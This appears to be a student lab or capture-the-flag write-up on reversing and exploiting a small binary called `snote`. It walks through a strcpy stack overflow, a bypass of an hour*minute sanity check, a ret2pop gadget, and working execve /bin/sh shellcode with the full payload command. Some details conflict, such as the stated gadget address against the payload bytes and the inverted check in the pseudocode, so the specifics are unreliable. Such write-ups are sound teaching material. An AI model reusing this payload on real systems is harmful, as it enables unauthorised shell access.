# Christa Write Up
### by Tilden Jackson (thjackso)
## Content
* [Binary Reversing](#reversing)
* [Vulnerability Details](#exploit-details)
* [Working Exploit](#working-exploit)

## Reversing
This code `./snote` has 2 main functions to consider: `main, note`. We start by running the code to take a look at what it does:
\
![This function takes two arguments in the command line: subject and note.](https://i.postimg.cc/m2C2S9xK/FirstRun.png)

Looking deeper at the binary we can get a deeper look at how it works:
![Main function disassembled](https://i.postimg.cc/gcRW9PMZ/main.png)
The main function stores `subject@argv[1]` in `-0x8(rbp)` and `note@argv[2]` in `-0x10(rbp)` and then sets up a call to `<note>`

Looking at `<note>` we see:
![Disassembled Note](https://i.postimg.cc/VkhGLJvL/note.png)

The function `<note>` takes 4 arguments as shown in the pseudocode bellow. The arguments subject is stored at %rdx and note is stored at %rcx. Note stores these at subject = `-0xa0(rbp)` and note = `-0xa8(rbp)` respectively. It then sets up a function call to `strcpy(buf, note)` with buffer at `-0x90(rbp)`. The function then checks that hour and minute (the first two args passed in to note) are not corrupted by checking that hour*minute <= 1440 (24*60). It then goes through a whole process of printing stuff out as was displayed.

---
A pseudocode of this binary would look like: 
```
int main(int argc,char const *argv[]){
	const char* subject = argv[1]; //@-0x8(rbp)
	const char* note = argv[2]; //@-0x10(rbp)

	if (argc != 3){
		puts(...);
		return -1;
	}

	time_t x;
	time_t local = localtime(time(&x));

	note(local+8, local+4, subject, note);
	return 0;
}

int note(int hour, int minute, const char* subject, const char* note){
	char buf[0x88]; //@-0x90(rbp)
	int hour = hour; //@-0x8(rbp)
	int minute = minute; //@-0x4(rbp)

	strcpy(buf, note);
	if (hour * minute <= 0x5a0){
		puts("*buffer overflow is detected!");
		exit(1);
	}

	printf("*Time: %d:%d\n",hour,minute);
	printf("*Subject: %s by CTO\n", subject);
	printf("*Note: %s\n", buf);
	
	return 0;
}
```
\
**Vulnerabilities**
We can exploit the `strcpy` function with a buffer overflow easily. However, the "stack canary"-esque buffer overflow check need to be resolved. We can easily do this by making the result negative because the multiplication is signed integer multiplication. I will do `-1 * -1` since this resolved to 1 anyways. 

Another problem is that we have ASLR enabled although GOT is not randomized, so we will have to utilize ret2pop or another method that is not stopped by ASLR.

## Exploit Details

We need to execute the shellcode that we will provide through the buffer. In order to do this we must juggle the stack to call the location of our input with the shell code. We must also subvert detection of buffer overflow by filling minute and hour with \xff so that they end up being -1.

Normally our stack diagram when we are executing note of the binary looks like
```
| addr rel. rbp in func | val|
------------------------------ (start <main> stack)
| -0x8  | argv[1] : subject  | 
------------------------------
| -0x10 | argv[2] : note     |           
------------------------------
| -0x18 | time               |
------------------------------
| -0x20 | localtime          |
------------------------------
| -0x24 | argc               |
------------------------------
| -0x30 | argv               |
------------------------------ (end <main> stack)
| +0x08 | return address     |
------------------------------
| +0x00 | old(rbp)           | 
------------------------------ (start <note> stack)
| -0x04  | minute            |
------------------------------
| -0x08 | hour               |           
------------------------------
|       |                    |
| -0x90 | buf[0x88]          |
|       |                    |
------------------------------
| -0x94 | hour               |
------------------------------
| -0x98 | minute             |
------------------------------
| -0xa0 | argv[1] : subject  |
------------------------------
| -0xa8 | argv[2] : note     |
------------------------------
| -0xb0 | stack end          |
------------------------------
```

We fill the buf with our shellcode at the base and then pad it so that our overflow of `\xff` fills hour and minute and then we will inject our own return address which will point to an instruction that has pop four times in a row and then a return in order to juggle our stack pointer up to the argv[2] spot in main. After the juggle, our rsp will point at the address of `argv[2]: note` saved by main which will then be called to execute our shell code in our input.
```
| addr rel. rbp in func | val|
------------------------------ (start <main> stack)
| -0x8  | argv[1] : subject  | 
------------------------------
| -0x10 | argv[2] : note     |           
------------------------------
| -0x18 | time               |
------------------------------
| -0x20 | localtime          |
------------------------------
| -0x24 | argc               |
------------------------------
| -0x30 | argv               |
------------------------------ (end <main> stack)
| +0x08 | 0x401413           | overflowed return address
|       | = pop x 4 + ret    |
------------------------------
| +0x00 | aaaaaaaa           | old(rbp)
------------------------------ (start <note> stack)
| -0x04 | 0xff ff ff ff = -1 | minute
------------------------------
| -0x08 | 0xff ff ff ff = -1 | hour    
------------------------------
|       |                    |
| -0x90 | shellcode + padding| buf[0x88]
|       |                    |
------------------------------
| -0x94 | hour               |
------------------------------
| -0x98 | minute             |
------------------------------
| -0xa0 | argv[1] : subject  |
------------------------------
| -0xa8 | argv[2] : note     |
------------------------------
| -0xb0 | stack end          |
------------------------------
```

These 4 pop instructions followed by a ret is able to be found in the `snote` binary so it is not randomized  (I found it using ropper). The following is what it looks like in the binary disassembly:
![4 pop instructions in binary](https://i.postimg.cc/pTHBpzHx/popx4.png)
## Working Exploit
The exploit is as we described and our alice.txt looks like this: `[b"ret2popx4", b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+b"\xff"*0x7d+b"\x14\x13\x40"]`

As input to the binary we would have:
```
$./snote ret2popx4 `python2 -c 'print(b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+b"\xff"*0x7d+b"\x14\x13\x40")'`

Where our shellcode is: b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
```

\
To check we run this command on the terminal:
![Exploit Result](https://i.postimg.cc/HWPBtJ00/exploit.png)
